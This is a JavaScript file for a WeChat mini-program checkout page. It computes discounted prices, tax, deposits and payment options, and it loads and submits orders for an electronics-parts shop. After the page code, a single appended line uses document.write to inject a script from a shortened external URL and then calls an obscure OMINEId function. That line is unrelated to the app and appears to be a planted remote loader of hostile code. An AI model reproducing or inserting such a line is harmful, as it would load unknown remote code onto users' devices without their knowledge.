var t = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
  return typeof t
}
  : function (t) {
    return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t
  },
  e = getApp(),
  a = e.requirejs("core"),
  i = e.requirejs("foxui"),
  d = e.requirejs("biz/diyform"),
  r = e.requirejs("jquery"),
  address = e.requirejs("address/adresscode-handle"),
  jq= r;
Page({
  data: {
    icons: e.requirejs("icons"),
    list: { showTab: "0", dispatchPrice: "20", realPrice: "5020", showAddress: true, changenum: "true", address: { consignee: "JL123", mobile: "13800138000", province: "广东省", city: "深圳市", area: "南山区", address: "赋安大厦A座301", area_code: "55" }, carrierInfo: { storename: "JL456123", consignee: "JJ789", mobile: "13813874561", address: "深圳市华强北" }, shopname: "商品信息", goods: [{ goodsid: "55", thumb: "/static/images/icon/shop.png", goodsid: "55263", hasdiscount: "true", title: "折扣大方仿放送", optiontitle: "单路LDO,输入电压2-6v,输出电压3.3v,输出电流，输出精度高:±2%,封装:SOT23-5,", price: "0.56", id: "1121", totalmaxbuy: "100", minbuy: "1", total: "50" }], invoicename: "玖隆科技", total: "5000", goodsprice: "0.666", couponcount: "50", deductcredit2: "60", stores: { storename: "华强北德赛", consignee: "HQ123", mobile: "1681688888", address: "华强一路", id: "54" } },
    sendData: {
      deliveryId: "1", is_invoice: "1", action: "createOrder", remark: "", order_type: "0", isOrder_type:false},
    data: {
      dispatchtype: 1,
      couponname:"456",
      deduct2: false
    },
    submit:true,
    pvalOld: [0, 0, 0],
    pval: [0, 0, 0],
    areas: [],
    noArea: true,
    FoxUIToast:{show:"",text:"什么"},
    payType: [{ type: "1", name: "在线支付", show: true }, { type: "2", name: "账期支付", show: true }, { type: "5", name: "银行转账", show: true }, { type: "6", name: "线下支付", show: false }, { type: "3", name: "快递代收", show: false }],
    order_payType: [{ type: "1", name: "在线支付", show: true }, { type: "6", name: "线下支付", show: false }, { type: "5", name: "银行转账", show: false }],
    typeChoose:"1",
    depositeChoose:"1",
    earnest:true,
    payment: { 
      // balance: "50000.00", pay: "45000.00", stillBalance: "5000.00",show:false
      },
    despositeSwitchShow:true
    //show:true

  },
  onLoad: function (t) {
    this.getAddress();
  },
  onShow: function () {
    var i = this,
      d = e.getCache("orderAddress"),
      s = e.getCache("orderShop");
      //console.log(d);
   this.data.show && d && (this.setData({
     "list.address": d,"sendData.addressId":d.id
    }) ),
      s && this.setData({
        "list.carrierInfo": s
      });
  },
  btnFilterBtns:function(e){
    //选择支付方式
    var types = e.currentTarget.dataset.type;
    var _this=this;
    var is_involist = _this.data.sendData.is_invoice;
    var lists = _this.data.list;
    var total=0;
    var order_payType=_this.data.order_payType;
    var payment =this.data.payment,earnest=0;
    jq.each(lists.goods, function (ind, value) {
      value = _this.count(value, is_involist, types);
      lists.goods[ind].price = parseFloat(value.price).toFixed(4);
      if (value.type != "sample")total+=parseFloat(value.total);
      if (value.earnest){
        earnest += parseFloat(value.earnest);
      }
    });
    if (earnest>0)lists.earnest = earnest.toFixed(2);
    lists.goodsTotal = parseFloat(total).toFixed(2);
    lists.realPrice = lists.goodsTotal;
    jq.each(order_payType,function(ind,val){
      order_payType[ind].show=false; 
    });
    if (_this.data.sendData.order_type>0){
      lists.realPrice = lists.earnest;
    };
    var showArray=[];
    var despositeSwitchShow=true;
    if(types==1){
      showArray=[0];
    } else if (types == 2){
      is_involist > 0 ? showArray = [0,1, 2] : showArray=[1];
      despositeSwitchShow =false;
      lists.realPrice = lists.earnest > 0 ? lists.earnest:0;
      if (payment.error ==1){
        return void i.toast(_this,"你还没有账期");
      }else{
        payment.pay = (lists.goodsTotal - lists.realPrice).toFixed(2);
        payment.stillBalance = (payment.data - payment.pay).toFixed(2);
        //if (payment.stillBalance<0) return void i.toast(_this, "你账期余额不足");
      };
    }else {
      is_involist > 0 ? showArray = [0, 2] : showArray = [1];
    }
    jq.each(showArray,function(ind,val){
      order_payType[val].show = true;
    });
    payment.show = types==2?true:false;
    _this.setData({
      despositeSwitchShow: despositeSwitchShow,
      list:lists,
      typeChoose:types,
      "payment": payment,
      order_payType: order_payType
    });
  }, 
  depositsPayType:function(t){
    //定金支付方式
    var depositePayType=t.currentTarget.dataset.type;
    var order_payType = this.data.order_payType;
    this.setData({
      depositeChoose: depositePayType
    });
  },
  getAddress: function (addObj,fn){
    var _this = this;
    wx.showToast({
      title: '',
      icon: 'loading',
      mask: true,
      duration: 1000
    });
    var sendData = {
      session_token: e.globalData.session_token,
      show_data: 'orderAddress'

    };
    sendData = jq.extend(sendData,addObj);
   // console.log(sendData, addObj);
    //获取购物车信息
    wx.request({
      url: e.globalData.daxin + "/Order/createOrder",
      data: sendData,
      method: "POST",
      success: function (res) {
        wx.hideToast();
       // console.log(res);
        var lists=_this.data.list,
        goods=[];
        if (res.data.statusCode >= 0 ) {
          wx.hideToast();
          if (addObj){
            if (fn) fn(res.data);
            return;
          }
          if (!res.data.data.list) { 
            wx.showModal({
              title: '提示信息',
              content: res.data.msg,
              showCancel: false,
              success: function (res) {
                if (res.confirm) {
                  wx.navigateBack();
                }
              }
            });return;}
          var storeRecommand = [];
          var lists=_this.data.list;
          var senddT=_this.data.sendData;
          var array = res.data.data.list.basket_detail ? res.data.data.list.basket_detail:[];
          var sample = res.data.data.list.basket_detail_sample ? res.data.data.list.basket_detail_sample:[];
          storeRecommand = _this.getObj(array,"product").concat(_this.getObj(sample, "sample"));
          lists.goods = storeRecommand;
          lists.pnum = array.length + sample.length;
          lists.address = res.data.data.address ? res.data.data.address:"";
          if (res.data.data.address){
            lists.address.addr = address.getData(res.data.data.address.area_code).join("");
            senddT.addressId = res.data.data.address.id;
            }else{
            senddT.addressId = "";
            };
          var totals=0;
          var earnest=0;
          jq.each(storeRecommand,function(indx,val){
            totals += val.total?parseFloat(val.total):0;
            storeRecommand[indx].price = parseFloat(val.price).toFixed(4);
            if (val.earnest) earnest += val.earnest;
          });
          if (earnest>0)lists.earnest = earnest.toFixed(2);
          lists.goodsTotal = totals.toFixed(2);
          lists.realPrice = totals.toFixed(2);
          lists.originTotal = totals.toFixed(2);
          
          var payment =_this.data.payment;
          payment = jq.extend(payment, (res.data.data.userAccount ? res.data.data.userAccount : { error: 1, show: false, one: null }));
          if (payment.error==0){

            payment.data = payment.data.toFixed(2);
            payment.pay = (totals - earnest).toFixed(2);
            payment.stillBalance = (payment.data - payment.pay).toFixed(2);
          }
          console.log(lists);
          _this.setData({
            show:true,
            list: lists,
            senddata: senddT,
            payment: payment
          });
        } else {
          wx.showModal({
            title: '提示信息',
            content: res.data.msg,
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                wx.navigateBack();
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
  getObj: function (array, sample) {
    var _this=this;
    var storeRecommand = [];
    if (array.length>0){
      jq.each(array, function (index, value) {
        var obj = jq.extend({},value);
        obj.title = value.p_sign;
        obj.id = value.id;
        obj.detail = value.parameter;
        obj.num = value.num > 0 ? value.num : 0;
        obj.store = value.store > 0 ? value.store : 0;
        obj.product_price = value.product_price;
        if (value.img) {
          obj.img = value.img.indexOf("http") > -1 ? value.img : (e.globalData.daxinImg + value.img);
        } else {
          obj.img = "";
        };
        value.img = obj.img;
        if (sample == "sample") {
          obj.price = 0;
          obj.type = "sample";
        } else {
          obj.type = "product";
          obj.price = value.price_show;
          obj =_this.count(value,1,1);//计算价格和结算
          if (obj.earnest_scale > 0 && parseFloat(obj.num) > parseFloat(obj.store)) { obj.earnest = obj.total * obj.earnest_scale } else { obj.earnest=0} ;
        };
        //obj.total = (obj.num * obj.price).toFixed(2);
        obj.realprice = (obj.total);
        storeRecommand.push(obj);
      });
    }
    return array.length > 0 ? storeRecommand : [];
  },
  count:function(obj,is_involist,payType){
    var is_desposite = this.data.sendData.order_type;
    var desposite_type = this.data.depositeChoose;
    var returnObj = jq.extend({}, obj);
    var origin_price = e.getPrice(obj.product_price, obj.num);
    //样品
    if (obj.type == "sample"){
      return obj;
    };
    if (obj.user_product_bargain){
      //优惠
      if (payType == 1 || payType==5) {
        //在线支付
        if (obj.user_product_bargain.discount_price > 0 && obj.user_product_bargain.discount_price_invoice_change == 0 && obj.user_product_bargain.discount_price_tax == 0){
           //只有优惠未税
          returnObj.price = obj.user_product_bargain.min_buy > 0 ?
            (returnObj.num - obj.user_product_bargain.min_buy > 0 ? (obj.user_product_bargain.discount_price * (returnObj.tax > 0 ? returnObj.tax : 1.1)) : obj.price_true):
           (obj.user_product_bargain.discount_price * (returnObj.tax > 0 ? returnObj.tax : 1.1));
          returnObj.total = parseFloat(returnObj.price).toFixed(4) * (returnObj.num|0);
        }else{  
          returnObj.price = (obj.user_product_bargain.discount_price_invoice_change > 0 ? obj.user_product_bargain.discount_price_invoice_change : obj.user_product_bargain.discount_price_tax) ;
          if (obj.user_product_bargain.min_buy > 0) returnObj.price = obj.num - obj.user_product_bargain.min_buy > 0 ? returnObj.price : obj.price_true;
          returnObj.total = parseFloat(returnObj.price).toFixed(4) * (returnObj.num|0);   
        }
      } else {
        //非在线支付
        if (is_involist>0){
          //开票账期支付
          if (payType==2){
              if (obj.user_product_bargain.discount_price > 0 && obj.user_product_bargain.discount_price_invoice_change == 0 && obj.user_product_bargain.discount_price_tax == 0) {
                //只有优惠未税
                returnObj.price = (obj.user_product_bargain.discount_price * (returnObj.tax > 0 ? returnObj.tax : 1.1));
                if (obj.user_product_bargain.min_buy > 0) returnObj.price = obj.num - obj.user_product_bargain.min_buy > 0 ? returnObj.price : obj.price_true;
                returnObj.total = parseFloat(returnObj.price).toFixed(4) * (returnObj.num|0);
              } else {
                returnObj.price = (obj.user_product_bargain.discount_price_invoice_change > 0 ? obj.user_product_bargain.discount_price_invoice_change : obj.user_product_bargain.discount_price_tax);
                if (obj.user_product_bargain.min_buy > 0) returnObj.price = obj.num - obj.user_product_bargain.min_buy > 0 ? returnObj.price : obj.price_true;
                returnObj.total = parseFloat(returnObj.price).toFixed(4) * (returnObj.num|0);
              }
        }else{
          //开票非在线支付按照开票在线支付执行
          if (obj.user_product_bargain.discount_price > 0 && obj.user_product_bargain.discount_price_invoice_change == 0 && obj.user_product_bargain.discount_price_tax == 0) {
            //只有优惠未税
            returnObj.price = (obj.user_product_bargain.discount_price * (returnObj.tax > 0 ? returnObj.tax : 1.1));
            if (obj.user_product_bargain.min_buy > 0) returnObj.price = obj.num - obj.user_product_bargain.min_buy > 0 ? returnObj.price : obj.price_true;
            returnObj.total = parseFloat(returnObj.price).toFixed(4) * (returnObj.num|0);
          } else {
            returnObj.price = (obj.user_product_bargain.discount_price_invoice_change > 0 ? obj.user_product_bargain.discount_price_invoice_change : obj.user_product_bargain.discount_price_tax);
            if (obj.user_product_bargain.min_buy > 0) returnObj.price = obj.num - obj.user_product_bargain.min_buy > 0 ? returnObj.price : obj.price_true;
            returnObj.total = parseFloat(returnObj.price).toFixed(4) * (returnObj.num|0);
          }
        }
      }else{
          if (obj.user_product_bargain.discount_price>0) {
            if (obj.user_product_bargain.discount_price_tax > 0 || obj.user_product_bargain.discount_price_invoice_change > 0){
              returnObj.price = obj.user_product_bargain.discount_price_invoice_change > 0 ? obj.user_product_bargain.discount_price_invoice_change : obj.user_product_bargain.discount_price_tax;
            }else{
              returnObj.price = obj.user_product_bargain.discount_price * (returnObj.tax > 0 ? returnObj.tax : 1.1);
            };
            if (obj.user_product_bargain.min_buy > 0) returnObj.price = obj.num - obj.user_product_bargain.min_buy > 0 ? returnObj.price : obj.price_true;
            returnObj.total = parseFloat(obj.user_product_bargain.discount_price).toFixed(4) * (returnObj.num|0);
          } else {
            returnObj.price = obj.user_product_bargain.discount_price_invoice_change > 0 ? obj.user_product_bargain.discount_price_invoice_change : obj.user_product_bargain.discount_price_tax;
            if (obj.user_product_bargain.min_buy > 0) returnObj.price = obj.num - obj.user_product_bargain.min_buy > 0 ? returnObj.price : obj.price_true;
            if ((returnObj.discount_num >= 0 && returnObj.price * returnObj.num > returnObj.discount_num) || !returnObj.discount_num) {
              //折扣限
              var realTax = obj.user_product_bargain.discount_price_invoice_change > 0 ? 1.1 : (returnObj.tax > 0 ? returnObj.tax : 1.1);
              if (is_desposite > 0 && desposite_type==1){
                returnObj.total = parseFloat(returnObj.price).toFixed(4) * (returnObj.num|0);
              }else{
                returnObj.total = parseFloat(returnObj.price/realTax).toFixed(4) * (returnObj.num|0) ;
              }
            } else {
              returnObj.total = parseFloat(returnObj.price).toFixed(4) * (returnObj.num|0);
            }
          }
        }
      }
    }else{
      //没优惠
      if (payType == 1 || payType == 5){
        //在线支付
        returnObj.price = origin_price;
        returnObj.total = parseFloat(returnObj.price).toFixed(4) * (returnObj.num|0);
      }else{
        if (is_involist > 0 && payType == 2){
           //开票账期支付
            returnObj.price = origin_price;
          returnObj.total = parseFloat(returnObj.price).toFixed(4) * (returnObj.num|0);
        }else{
           //非在线支付
          //开票非在线支付同开票在线支付
          returnObj.price = origin_price;
          returnObj.total = parseFloat(returnObj.price).toFixed(4) * (returnObj.num|0);
          if ((returnObj.discount_num >= 0 && returnObj.price * returnObj.num > returnObj.discount_num) || !returnObj.discount_num) {
            //折扣限
            if (is_desposite > 0 && desposite_type == 1) {
              returnObj.total = parseFloat(returnObj.price).toFixed(4) * (returnObj.num|0);
            } else {
              returnObj.total = parseFloat(returnObj.price/ (returnObj.tax > 0 ? returnObj.tax : 1.1)).toFixed(4) * (returnObj.num|0) ;
            }
          } else {
            returnObj.total = parseFloat(origin_price).toFixed(4) * (returnObj.num|0);
          }
        }
      }
    }
    returnObj.total = parseFloat(returnObj.total).toFixed(2);
    if (returnObj.earnest_scale)returnObj.earnest = returnObj.total * returnObj.earnest_scale;
    return returnObj;
  },
  toggle: function (t) {
    var e = a.pdata(t),
      i = e.id,
      d = e.type,
      r = {};
    r[d] = 0 == i || void 0 === i ? 1 : 0,
      this.setData(r)
  },
  phone: function (t) {
    a.phone(t)
  },
  dispatchtype: function (t) {
    var e = a.data(t).type;
    var sendData=this.data.sendData;
    let payType=this.data.payType;
    let data = {
      "data.dispatchtype": e,
      "sendData.deliveryId": e,
    }
    if (e == 1 && sendData.is_invoice ==="0"){
      payType[4].show=true;
      data.payType = payType;
    }else{
      payType[4].show = false;
      data.payType = payType;
    };
    this.setData(data) ;
  },
  getTotal: function (data) {
    var data = data || this.data.merch_list;
    var total = 0;
    jq.each(data, function (ind, val) {
      var j;
      for (j = 0; j < val.list.length; j++) {
        if (val.list[j].selected == 1) {
          total += val.list[j].price * val.list[j].num;
        }
      };
    });
    return parseFloat(total).toFixed(2);
  },
  submit: function () {
    //提交订单
    var _this = this,
      senddatas = this.data.sendData,
      payType = this.data.typeChoose,
      list=this.data.list;
    if (_this.submit) {
      _this.setData({
        submit: false
      });
      if (senddatas.order_type>0)senddatas.deposits_pay_type = this.data.depositeChoose;
      if (payType==2){
        if(list.earnest>0){
          senddatas.order_type = "1";
          senddatas.deposits_pay_type = this.data.depositeChoose;
        } 
      };
      senddatas.pay_type = payType;
      if ((senddatas.is_invoice > 0 && payType == "6") || (senddatas.is_invoice == "0" && payType == "5")) {
        a.alert("请选择支付方式!");
        return;
      }
      if (!senddatas.addressId && senddatas.deliveryId!=3){
        a.alert("地址没有选择!"); 
        return;
      }
      if (senddatas.order_type > 0 && !senddatas.deposits_pay_type) {
        a.alert("请选择定金支付方式!");
        return;
      }
    
      _this.getAddress(senddatas,function(datas){
        _this.setData({
          submit: true
        });
        if (payType == "1" || senddatas.deposits_pay_type ==1){
          wx.navigateTo({
             url: "/pages/order/pay/index?id=" + datas.data.order_sn
          });
        }else{
          wx.showModal({
            title: '下单成功',
            content: '银行转账，账期支付，请去pc端支付',
            showCancel:false,
            success:function(res){
              if(res.confirm){
                wx.navigateBack();
              }
            }
          })
          
        }
        
      }); 
    }
  },
  dataChange: function (t) {
    var _this = this,
      e = _this.data.data,
      a = _this.data.sendData,
      payType = _this.data.payType,
      order_payType = _this.data.order_payType,
      typeChoose = _this.data.typeChoose,
      lists = _this.data.list; 
    let idType = t.currentTarget.dataset.id;
    var payment = this.data.payment;
    if (idType != "order_type" && idType != "remark"){
      
      jq.each(order_payType, function (ind, val) {
        order_payType[ind].show = false;
      });
      var showArray = [];
      let dispatchtype = _this.data.data.dispatchtype;
      if (typeChoose == 1) {
        showArray = [0];
      } else if (typeChoose == 2) {
        t.detail.value > 0 ? showArray = [0, 1, 2] : showArray = [1];
      } else {
        t.detail.value > 0 ? showArray = [0, 2] : showArray = [1];
      }
      jq.each(showArray, function (ind, val) {
        order_payType[val].show = true;
      });
      t.detail.value ? (payType[2].show = true, payType[3].show = false, payType[4].show = false) : (payType[2].show = false, payType[3].show = true, (dispatchtype == 1 ? (payType[4].show = true) : (payType[4].show = false))) ;
    }
    switch (idType) {
      case "involist":
      //是否开票
        a.is_invoice = t.detail.value?"1":"0";
        var total = 0,earnest=0;
        jq.each(lists.goods,function(ind,value){
          value = _this.count(value, a.is_invoice, _this.data.typeChoose);
          lists.goods[ind].price = parseFloat(value.price).toFixed(4);
          if(value.type!="sample")total+=parseFloat(value.total);
          if (value.earnest)earnest += parseFloat(value.earnest);
        }); 
        if (earnest > 0) lists.earnest = earnest.toFixed(2);
        lists.goodsTotal = parseFloat(total).toFixed(2);
        payment.pay =parseFloat(total).toFixed(2);
        payment.stillBalance = (payment.data - total).toFixed(2);
        if (typeChoose == 2 || (_this.data.order_type > 0 && typeChoose != 2)){
          lists.realPrice = lists.earnest||"0.00";
          }else{
          lists.realPrice = lists.goodsTotal;
        }
        break;
      case "remark":
      //备注
        a.remark = t.detail.value ? t.detail.value : "";
        break;
      case "order_type":
      //是否订金
        a.order_type = t.detail.value ? "1" : "0";
        if (t.detail.value) { a.isOrder_type = true; } else { a.isOrder_type = false;};
        if (t.detail.value && lists.earnest > 0) {
          lists.realPrice = lists.earnest;
        } else {
          lists.realPrice =lists.goodsTotal;
        }
        break;
    }
    _this.setData({
      list:lists,
      sendData: a,
      payment:payment,
      order_payType: order_payType,
      payType:payType
    })
  },
  listChange: function (t) {
    var e = this.data.list;
    switch (t.target.id) {
      case "invoicename":
        e.invoicename = t.detail.value;
        break;
      case "realname":
        e.member.realname = t.detail.value;
        break;
      case "mobile":
        e.member.mobile = t.detail.value
    }
    this.setData({
      list: e
    })
  },
  url: function (t) {
    var e = a.pdata(t).url;
    wx.redirectTo({
      url: e
    })
  },
  onChange: function (t) {
    return d.onChange(this, t)
  },
  DiyFormHandler: function (t) {
    return d.DiyFormHandler(this, t)
  },
  selectArea: function (t) {
    return d.selectArea(this, t)
  },
  bindChange: function (t) {
    return d.bindChange(this, t)
  },
  onCancel: function (t) {
    return d.onCancel(this, t)
  },
  onConfirm: function (t) {
    return d.onConfirm(this, t)
  },
  getIndex: function (t, e) {
    return d.getIndex(t, e)
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
